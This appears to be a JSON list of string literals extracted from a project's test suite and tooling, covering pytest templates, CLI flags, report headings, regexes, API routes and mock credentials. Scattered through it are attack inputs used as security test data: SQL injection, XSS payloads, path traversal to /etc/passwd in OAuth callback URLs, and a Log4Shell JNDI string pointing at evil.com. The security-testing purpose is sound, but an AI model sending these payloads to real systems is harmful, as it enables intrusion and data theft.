{
  "values": [
    "\u001b[0m",
    "\u001b[0m -",
    "\u001b[91m",
    "\u001b[91mReal E2E Tests:",
    "!!! DANGEROUS MODE ENABLED !!!",
    "!@#$%^&*()_+-=[]{}|;:,.<>?",
    "\"",
    "\"\"\"",
    "\"\"\"\n\nimport pytest\nfrom unittest.mock import Mock, patch, MagicMock\nimport sys\nfrom pathlib import Path\n\n# Add parent directory to path\n\nfrom",
    "\"\"\"\n    \n    @pytest.fixture(autouse=True)\n    def setup(self):\n        \"\"\"Set up test fixtures\"\"\"\n        self.mock_data = {\"test\": \"data\"}\n        yield\n        # Cleanup if needed",
    "\"\"\"\n        # Critical function - test error scenarios\n        with pytest.raises(Exception):\n            pass  # TODO: Add actual error test",
    "\"\"\"\n        # High complexity function - test boundary conditions\n        pass",
    "\"\"\"\n        # TODO: Implement based on function signature\n        # Function args:",
    "\"\"\"\nTests for",
    "\"\"\".*for testing.*\"\"\"",
    "\"\"\".*mock implementation.*\"\"\"",
    "\"\"\".*test implementation.*\"\"\"",
    "\"\"\"Split from",
    "\"\"\"Split test module - imports all parts.\"\"\"",
    "\"\"\"Test class for orphaned methods\"\"\"",
    "\"\"\"Test module.\"\"\"",
    "\",",
    "\",\"",
    "\"agent\"",
    "\"api\"",
    "\"auth or security\"",
    "\"database or db\"",
    "\"e2e\"",
    "\"integration\"",
    "\"not integration and not e2e\"",
    "\"performance\"",
    "\"smoke\"",
    "\"websocket or ws\"",
    "#",
    "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url",
    "# ACT environment detection - ACT sets this automatically",
    "# ACT will override",
    "# Add project root to path",
    "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock",
    "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock",
    "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock",
    "# Complexity:",
    "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock",
    "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"",
    "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock",
    "# FIXME:",
    "# Generated from",
    "# Has return:",
    "# Incomplete import statement",
    "# Justified:",
    "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock",
    "# Mock implementation",
    "# Mock justified",
    "# Project Real Test Requirements Violations",
    "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n",
    "# Real Service Test Report",
    "# Real Test Requirements Fix Plan",
    "# Real Test Requirements Violations Report",
    "# Real component behavior: \\1 handles \\2",
    "# Real component setup: \\1 configured for \\2",
    "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto",
    "# Setup test path\\n(?=\\n)",
    "# TODO: Implement split test logic",
    "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock",
    "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **",
    "# Test Overlap Analysis Report",
    "# Test Size Compliance Report",
    "# Test Size Violations Report",
    "# Test implementation",
    "# Test stub",
    "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock",
    "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()",
    "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock",
    "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: âœ… WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: âœ… WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: âœ… WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: âœ… WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: âœ… WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:",
    "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:",
    "##",
    "## Cache Performance",
    "## Category Analysis",
    "## Database Performance",
    "## Errors",
    "## Exact Duplicates âš ï¸",
    "## Executive Summary",
    "## File Splits Required",
    "## Function Refactoring Required",
    "## Highly Similar Tests",
    "## Identified Issues\n\n### 1. Configuration Sprawl",
    "## Immediate Fixes (Can be automated)",
    "## Impact Analysis",
    "## LLM API Usage",
    "## Mock Reduction Required",
    "## Most Problematic Files",
    "## Quality Gate Scores",
    "## Recommendations",
    "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml",
    "## Splitting Suggestions",
    "## Summary",
    "## Test Details by Category",
    "## Test Results Summary",
    "## Test Validation Status",
    "## Top 20 Worst Violators",
    "## Violations",
    "## Violations by Type",
    "## Warnings",
    "## âš ï¸ WARNING",
    "## ðŸŽ¯ Priority Fix List",
    "## ðŸ“‹ Violations by Category",
    "## ðŸ› ï¸ Recommended Actions",
    "###",
    "### 2. Test Locations\n\nTop test directories by file count:",
    "### 2. Test Organization",
    "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions",
    "### 4. Key Test Directories",
    "### File Size Violations",
    "### Function Size Violations",
    "### Similarity Breakdown",
    "#### 3.2 Test Structure\n- Test directories:",
    "$(STAGING_DB_PASSWORD)",
    "${jndi:ldap://evil.com/exploit}",
    "%",
    "%\n\n## Test Results",
    "% goal",
    "% to reach",
    "% to target 85%",
    "%(asctime)s - %(levelname)s - %(message)s",
    "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    "%)",
    "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.",
    "%, target: 75%)",
    "%Y%m%d_%H%M%S",
    "%Y-%m-%d %H:%M:%S",
    "&",
    "&state=",
    "&state=123456",
    "&state=invalid_state",
    "&state=other_session_state",
    "&state=predictable_state",
    "&state=reused_state_123",
    "'",
    "' (current:",
    "' --testPathPattern=e2e",
    "' --testPathPattern=integration",
    "' --testPathPattern=unit",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "' appears too frequently:",
    "' defined in test file",
    "' exceeds",
    "' has",
    "' has high average complexity (",
    "' into smaller, focused test functions",
    "' not configured",
    "' not found",
    "' not in execution list",
    "' spans",
    "' to a shared fixture or use real components",
    "' to a shared test utility module or use real components",
    "'''",
    "', got '",
    "':",
    "'; DROP TABLE users; --",
    "'; INSERT INTO users VALUES('hacker','pass'); --",
    "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
    "';alert('XSS');//",
    "(",
    "()",
    "() -",
    "():",
    "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}",
    "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}",
    "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []",
    "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}",
    "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"",
    "(*args, **kwargs):\n    \"\"\"Test stub implementation for",
    "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}",
    "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True",
    "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?",
    "(?:async )?def (test_\\w+)",
    "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]",
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(async def)",
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(def)",
    "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )",
    "(Address when convenient)",
    "(JS/TS)",
    "(Must fix immediately)",
    "(Priority:",
    "(Score:",
    "(Should fix soon)",
    "([\\w/\\\\\\.]+::\\S+)",
    "([^\\s]+\\.py)",
    "(\\d+) failed",
    "(\\d+) failed.*(\\d+) passed",
    "(\\d+) passed",
    "(\\d+)\\s+passed.*?(\\d+)\\s+total",
    "(\\s+)def __init__\\(self\\):\\s*\\n(\\s+)super\\(\\).__init__\\(\\)\\s*\\n",
    "(\\w+)\\.return_value = (.+)",
    "(\\w+)\\.side_effect = (.+)",
    "(\\w+)\\s*\\(",
    "(^|\\n)(async def",
    "(^|\\n)(class",
    "(class TestSyntaxFix.*?\\n)(.*?)(?=\\nclass |\\Z)",
    "(currently",
    "(end-to-end tests)",
    "(exception)",
    "(excluding dependencies)",
    "(expected format: resource:action)",
    "(expected:",
    "(integration tests)",
    "(matched:",
    "(self):",
    "(self):\n        \"\"\"Test",
    "(shared utilities)",
    "(similarity:",
    "(too large)",
    "(under 300 line limit)",
    "(unit tests)",
    "(~",
    ")",
    ") -",
    "). Consider breaking down complex tests into simpler units.",
    ")...",
    "):",
    "): Creates confusion",
    "): Overlapping functionality",
    "): Should be consolidated",
    ")[/red]",
    "*",
    "**",
    "** (",
    "** -",
    "***",
    "*** ALL WEBSOCKET TESTS PASSED! ***",
    "**/",
    "**/*.py",
    "**/*.test.js",
    "**/*.test.jsx",
    "**/*.test.ts",
    "**/*.test.ts*",
    "**/*.test.tsx",
    "**/*_l3.py",
    "**/*_test.py",
    "**/__tests__/**/*.js",
    "**/__tests__/**/*.jsx",
    "**/__tests__/**/*.ts",
    "**/__tests__/**/*.tsx",
    "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)",
    "**/__tests__/integration/**/*.test.[jt]s?(x)",
    "**/__tests__/integration/critical-integration.test.tsx",
    "**/__tests__/system/startup.test.tsx",
    "**/conftest.py",
    "**/e2e/**",
    "**/integration/**",
    "**/jest.setup.js",
    "**/performance/**",
    "**/security/**",
    "**/setupTests.js",
    "**/test*.py",
    "**/test_*.py",
    "**/tests/**/*.py",
    "**/unit/**",
    "**Description**:",
    "**Duration:**",
    "**Error**:\n```",
    "**Exit Code**:",
    "**Generated:**",
    "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.",
    "**Output**:\n```",
    "**Top Overlaps:**",
    "**Total LLM Cost:** $",
    "**Total Violations:**",
    "**âš ï¸ WARNING:** Some tests are already failing. Fix these before refactoring!",
    "*.json",
    "*.py",
    "*.spec.*",
    "*.spec.ts",
    "*.spec.tsx",
    "*.test.*",
    "*.test.js",
    "*.test.jsx",
    "*.test.ts",
    "*.test.ts*",
    "*.test.tsx",
    "*.ts",
    "*.tsx",
    "*.yml",
    "*_test.py",
    "*test*.py",
    "*test*.ts",
    "*test.py",
    "+",
    "+00:00",
    ",",
    ", Got:",
    ", Improvement:",
    ", Optimization:",
    ", SPEC/testing.xml)",
    ", connection=",
    ", expected pattern",
    ", first import at line",
    ", got",
    ", jest.mock:",
    ", max_files=",
    ", service2=",
    ", skipping",
    ", type:",
    ", using 'unit'",
    ", using simple line counting:",
    ", ~",
    ",\"",
    ",line=",
    "-",
    "- **",
    "- **Average Score:**",
    "- **Critical:**",
    "- **Exact Duplicates**:",
    "- **Exact Duplicates**: 0 âœ…",
    "- **Excessive conftest files** (",
    "- **Failed**:",
    "- **Failed:**",
    "- **Files exceeding",
    "- **Functions exceeding",
    "- **Highly Similar**:",
    "- **Hit Rate:**",
    "- **Hits:**",
    "- **Inconsistent L3 pattern** used in",
    "- **Legacy test directories** found:",
    "- **Major:**",
    "- **Max Score:**",
    "- **Min Score:**",
    "- **Minor:**",
    "- **Misses:**",
    "- **Multiple test configurations** (",
    "- **Multiple test runners** (",
    "- **Non-standard naming** in",
    "- **Pass Rate:**",
    "- **Passed**:",
    "- **Passed:**",
    "- **Related**:",
    "- **Similar**:",
    "- **Success Rate**:",
    "- **Suggestion:** Extract helper methods or use fixtures",
    "- **Suggestion:** Split into multiple focused test modules",
    "- **Total Similarity Pairs**:",
    "- **Total Test Files**:",
    "- **Total Test Functions**:",
    "- **Total Tests:**",
    "- **Total Validations:**",
    "- **Total test files scanned:**",
    "- **Total violations:**",
    "- ... and",
    "- API:",
    "- All services correctly default to STAGING (not production)",
    "- Allow dev login:",
    "- Allow mock auth:",
    "- App:",
    "- Auth:",
    "- Avg Complexity:",
    "- CLAUDE.md (development standards)",
    "- CRITICAL:",
    "- Configuration files:",
    "- Conftest files:",
    "- Cross-Category Overlaps:",
    "- Duplicates:",
    "- Ensures AI quality meets expectations",
    "- Environment detection logic works as expected",
    "- Errors in",
    "- Failed:",
    "- Failing:",
    "- File size violations:",
    "- Fixed",
    "- Frontend:",
    "- Full customer journey validation",
    "- Function size violations:",
    "- Highly Similar:",
    "- Integration tests with mocks defeat the purpose of integration testing",
    "- Internal Overlaps:",
    "- MAJOR:",
    "- MINOR:",
    "- Max violation:",
    "- Mock component implementations in test files violate real test requirements",
    "- OAuth configuration appropriate for each environment",
    "- Passed:",
    "- Passing:",
    "- Risk of false positive test results hiding real bugs",
    "- SPEC/testing.xml (comprehensive testing standards)",
    "- Skipped",
    "- Test directories:",
    "- Test locations:",
    "- Test runners found:",
    "- Tests validated:",
    "- Tests:",
    "- Total Lines:",
    "- Total test files:",
    "- Total violations:",
    "- Validates SLA compliance",
    "- [ ]",
    "- [CRITICAL]:",
    "- [MAJOR]:",
    "- [MINOR]:",
    "- `",
    "- app/tests/examples/test_real_functionality_examples.py (patterns)",
    "- tests are already failing",
    "--",
    "--- Iteration",
    "--- Progress Summary ---",
    "--all",
    "--allow-prod",
    "--api-port",
    "--asyncio-mode=auto",
    "--auth-url",
    "--auto-split",
    "--backend-url",
    "--backup-dir",
    "--bail",
    "--base-url",
    "--benchmark",
    "--build",
    "--cache-dir",
    "--cacheDirectory",
    "--categories",
    "--category",
    "--check-deps",
    "--cleanup-on-exit",
    "--clear-cache",
    "--color=yes",
    "--confirm-unsafe",
    "--cov",
    "--cov-fail-under=",
    "--cov-report=html",
    "--cov-report=html:reports/coverage/html",
    "--cov-report=json",
    "--cov-report=json:reports/coverage/coverage.json",
    "--cov-report=term-missing",
    "--cov=",
    "--cov=.",
    "--cov=app",
    "--cov=netra_backend.app",
    "--coverage",
    "--coverage=false",
    "--coverageDirectory=",
    "--cypress-open",
    "--detectOpenHandles",
    "--directory",
    "--disable-auto-split",
    "--disable-safe-mode",
    "--disable-warnings",
    "--docker",
    "--dry-run",
    "--dry-run, -n     : Show what would be renamed without doing it",
    "--durations=20",
    "--e2e",
    "--env",
    "--exclude-env",
    "--execute",
    "--execute         : Actually perform the renames",
    "--execute --limit=30",
    "--fail-fast",
    "--fail-fast-mode",
    "--failed-first",
    "--fast-fail",
    "--ff",
    "--file",
    "--fix",
    "--force",
    "--force-unsafe-fix",
    "--forceExit",
    "--format",
    "--frontend-port",
    "--full",
    "--git-diff",
    "--github-actions",
    "--help",
    "--help, -h        : Show this help",
    "--host",
    "--html-output",
    "--html=reports/tests/report.html",
    "--install-deps",
    "--integration-first",
    "--isolation",
    "--iterations",
    "--json",
    "--json-output",
    "--json-report",
    "--json-report-file=reports/tests/report.json",
    "--json-report-file=test_results.json",
    "--keyword",
    "--level",
    "--limit=",
    "--limit=N, -lN    : Process only first N files",
    "--lint",
    "--list",
    "--list-categories",
    "--markers",
    "--max-files",
    "--max-workers",
    "--maxWorkers=",
    "--maxWorkers=1",
    "--maxWorkers=2",
    "--maxfail=1",
    "--maxfail=50",
    "--min-coverage",
    "--module",
    "--name-only",
    "--no-bad-test-detection",
    "--no-browser",
    "--no-cache",
    "--no-coverage",
    "--no-env-setup",
    "--no-fail-fast",
    "--no-header",
    "--no-summary",
    "--no-wait",
    "--noEmit",
    "--optimization",
    "--output",
    "--parallel",
    "--passWithNoTests",
    "--pattern",
    "--port",
    "--profile",
    "--progress-mode",
    "--project-root",
    "--quick",
    "--quiet",
    "--real-e2e",
    "--real-llm",
    "--real-services",
    "--reload",
    "--repo",
    "--report",
    "--report-only",
    "--resume-from",
    "--root-dir",
    "--run-id",
    "--scan",
    "--scan-all",
    "--secret-file",
    "--self-contained-html",
    "--service",
    "--show-category-stats",
    "--show-warnings",
    "--simulate",
    "--spec",
    "--splitting-strategy",
    "--strategy",
    "--strict",
    "--strict-markers",
    "--tb=no",
    "--tb=short",
    "--testMatch",
    "--testNamePattern=",
    "--testPathPattern=__tests__/(components|hooks|store)",
    "--timeout-keep-alive",
    "--timeout=",
    "--timeout=5",
    "--token",
    "--type-check",
    "--update-snapshots",
    "--updateSnapshot",
    "--validate",
    "--validate-tests",
    "--verbose",
    "--version",
    "--wait-for-completion",
    "--wait-for-completion requires --workflow-name",
    "--watch",
    "--window-size",
    "--workers",
    "--workflow-name",
    "-01",
    "->",
    "-P",
    "-W",
    "-_",
    "-b",
    "-c",
    "-d",
    "-e",
    "-f",
    "-h",
    "-k",
    "-l",
    "-m",
    "-n",
    "-name",
    "-o",
    "-p",
    "-q",
    "-rN",
    "-s",
    "-t",
    "-type",
    "-u",
    "-v",
    "-vv",
    "-w",
    "-x",
    "-xvs",
    ".",
    ". Consider consolidating or improving test coverage.",
    ". [",
    ". `",
    ".\"\"\"",
    ".\"\"\"\n    return {\"status\": \"ok\"}",
    "...",
    "...\n[bold]Redirect URI:[/bold]",
    "... and",
    "...[/cyan]",
    "../../../etc/passwd",
    "../reports/frontend-coverage",
    ".1%",
    ".1f",
    ".2%",
    ".2f",
    ".3f",
    ".4f",
    ".6f",
    ".<40",
    ".cache",
    ".coverage",
    ".db",
    ".eggs",
    ".env",
    ".env.test",
    ".env.test*",
    ".git",
    ".github",
    ".idea",
    ".invalid_signature",
    ".jpg",
    ".js",
    ".json",
    ".jsx",
    ".mypy_cache",
    ".py",
    ".pytest_cache",
    ".return_value =",
    ".ruff_cache",
    ".secrets",
    ".service_discovery",
    ".signature",
    ".tampered",
    ".test",
    ".test.",
    ".test.ts",
    ".test.tsx",
    ".test_backups_",
    ".tox",
    ".ts",
    ".tsx",
    ".venv",
    ".vs",
    ".vscode",
    ".yaml",
    "/",
    "/ directory...",
    "/**/*.test.[jt]s?(x)",
    "/100",
    "/100 ---",
    "/100 ===",
    "/__init__.py",
    "/_next/static",
    "/`",
    "/`:",
    "/api/auth/config",
    "/api/auth/dev_login",
    "/api/auth/login?provider=google",
    "/api/auth/me",
    "/api/health",
    "/api/threads",
    "/api/user/me",
    "/api/v1/agents",
    "/api/v1/auth/callback",
    "/api/v1/auth/callback/google",
    "/api/v1/auth/callback?",
    "/api/v1/auth/callback?code=",
    "/api/v1/auth/callback?code=../../../etc/passwd",
    "/api/v1/auth/callback?code=<script>&state=test",
    "/api/v1/auth/callback?code=test%00&state=test",
    "/api/v1/auth/callback?code=test&state=",
    "/api/v1/auth/callback?code=test' OR '1'='1&state=test",
    "/api/v1/auth/callback?code=test; DROP TABLE users;&state=test",
    "/api/v1/auth/callback?code=test_code",
    "/api/v1/auth/callback?code=test_code&state=",
    "/api/v1/auth/callback?code=test_code&state=test_state",
    "/api/v1/auth/callback?error=access_denied&state=test_state",
    "/api/v1/auth/callback?state=test",
    "/api/v1/auth/callback?state=test_state",
    "/api/v1/auth/config",
    "/api/v1/auth/health",
    "/api/v1/auth/login?provider=",
    "/api/v1/auth/login?provider=google",
    "/api/v1/auth/login?provider=invalid_provider",
    "/api/v1/auth/logout",
    "/api/v1/auth/verify",
    "/api/v1/threads",
    "/api/v1/threads/",
    "/api/v1/user/profile",
    "/api/v1/workspaces",
    "/app/tests/integration/",
    "/auth/",
    "/auth/callback",
    "/auth/callback/google",
    "/auth/callback?code=",
    "/auth/callback?code=valid_code&state=",
    "/auth/dev-login",
    "/auth/health",
    "/auth/login",
    "/auth/login/google",
    "/auth/login?provider=google",
    "/auth/login?provider=google&scope=",
    "/auth/logout",
    "/auth/password",
    "/auth/refresh",
    "/auth/service-token",
    "/auth/sessions",
    "/auth/sessions/",
    "/auth/token",
    "/auth/user",
    "/auth/validate",
    "/auth/verify",
    "/callback",
    "/cloudsql/",
    "/docs",
    "/e2e/",
    "/etc/passwd",
    "/health",
    "/health/",
    "/health/live",
    "/health/ready",
    "/integration/",
    "/messages",
    "/postgres",
    "/secure",
    "/tests/",
    "/tests/e2e/",
    "/tests/integration/",
    "/tests/unified/e2e/",
    "/tests/unit/",
    "/unit/",
    "/v1",
    "/ws",
    "/ws/config",
    "/ws/health",
    "0.0.0.0",
    "00-",
    "1",
    "1' OR 1=1 UNION SELECT @@version --",
    "1. **Fix Critical Violations First** - Address mock component implementations",
    "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment",
    "1. Back up all files first",
    "1. Check for missing dependencies: pip install -r requirements.txt",
    "1. Extract setup logic into fixture or helper method",
    "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)",
    "1. Mock component function fix",
    "1. Move fixtures to appropriate service-level conftest.py",
    "1. Quick real e2e test (with mock services):",
    "1. Review SPEC/no_test_stubs.xml for guidelines",
    "1. Review the changes with: git diff",
    "1. Review the report above",
    "1. Run tests to verify functionality: python unified_test_runner.py",
    "1. Set GOOGLE_CLIENT_ID in .env file",
    "1. Split by test categories (unit/integration/e2e)",
    "1. Split by test categories:",
    "1. Test Size Validator - scans for violations",
    "1. Test Size Validator:",
    "1. Test files MUST be â‰¤300 lines (SPEC/testing.xml)",
    "1. Testing import resolution...",
    "1. `",
    "1.1.1.1,",
    "1.5s",
    "10",
    "12",
    "123",
    "123456",
    "123456789",
    "127.0.0.1",
    "13/15",
    "15",
    "192.168.1.1",
    "192.168.1.100",
    "1h 1m",
    "1m 30s",
    "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory",
    "2. Check git status: git status",
    "2. Delete the violating conftest.py files",
    "2. Full real e2e test (with actual LLM):",
    "2. Large file splitting",
    "2. Look for circular imports in the error messages above",
    "2. Manually refactor files with violations",
    "2. Replace test stubs with real implementations",
    "2. Run mock-only tests: pytest -m mock_only",
    "2. Set GOOGLE_CLIENT_SECRET in .env file",
    "2. Split by functionality being tested",
    "2. Split by test classes:",
    "2. Split into multiple focused test cases",
    "2. Test Refactoring Helper - suggests splits",
    "2. Test Refactoring Helper:",
    "2. Test functions MUST be â‰¤8 lines (SPEC/testing.xml)",
    "2. Testing command generation...",
    "2. Tests expecting specific implementation details that have changed",
    "2. Use dry-run mode to preview changes",
    "2.0",
    "20",
    "2025-08-24T00:00:00Z",
    "2d",
    "3",
    "3. **Use Real Components** - Replace mocks with actual component instances",
    "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'",
    "3. Extract assertion logic into helper methods",
    "3. Extract helper functions:",
    "3. Function size reduction",
    "3. Integration tests running as unit tests",
    "3. Manually refactor instead of using auto-fix",
    "3. Move test helpers to app/tests/ directory",
    "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services",
    "3. Set JWT_SECRET_KEY in .env file (must match auth service)",
    "3. Split by functionality, test type, or scenario",
    "3. Split by test class if using class-based tests",
    "3. Test Runner Integration - pre-run validation",
    "3. Test Runner Integration:",
    "3. Testing full startup integration...",
    "3. Update test imports if necessary",
    "3. Use established patterns like fixtures and helper functions",
    "3. Verify all module files exist and have no syntax errors",
    "3. With specific LLM model:",
    "30",
    "300",
    "30s",
    "35.223",
    "3d",
    "4",
    "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases",
    "4. Check that __init__.py files exist in all package directories",
    "4. Compliance Examples - properly sized tests",
    "4. Extract common setup to fixtures or helper functions",
    "4. Mock reduction in integration tests",
    "4. Move helper functions to separate test utilities module",
    "4. Run 'python scripts/remove_test_stubs.py --scan' locally",
    "4. Run tests after each refactoring to ensure correctness",
    "4. Split by feature being tested:",
    "4. Start auth service: python -m auth_service.auth_core.main",
    "4. Use parameterized tests for multiple scenarios",
    "4. View Examples:",
    "4d",
    "5. **Split Large Functions** - Break down oversized test functions",
    "5. Start backend service: python scripts/dev_launcher.py",
    "5. Use parameterized tests to reduce duplication",
    "50ms",
    "5432",
    "6",
    "6. Check OAuth redirect configuration in backend",
    "6379",
    "7",
    "7. Check token generation in auth service",
    "7. Enable dev login: Set ALLOW_DEV_LOGIN=true in .env",
    "8",
    "8000",
    "8080",
    "8081",
    "999999999",
    ":",
    ":\n    \"\"\"Comprehensive test suite for",
    ":\n    \"\"\"Test suite for",
    ": <not set>",
    ": Custom runner without ACT comment",
    ": Implement",
    ": MISSING - No API key",
    ": No tests run",
    ": OK - API key configured (from",
    ": expected",
    ": got",
    "://",
    "://***@",
    "::",
    "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>",
    "</div></body></html>",
    "<30",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<img src=x onerror=alert('XSS')>",
    "<script>",
    "<script>alert('XSS')</script>",
    "<script>document.cookie='admin=true'</script>",
    "<svg onload=alert('XSS')>",
    "=",
    "=== AUTHENTICATION TESTS ===",
    "=== Agent Initialization Tests ===",
    "=== BASIC FUNCTIONALITY TESTS ===",
    "=== Checking PostgreSQL Availability ===",
    "=== Final Summary ===",
    "=== L3 Test File Standardization ===",
    "=== Mock Analysis Summary ===",
    "=== OUTPUT FORMAT TESTS ===",
    "=== Progress:",
    "=== REPOSITORY HANDLING TESTS ===",
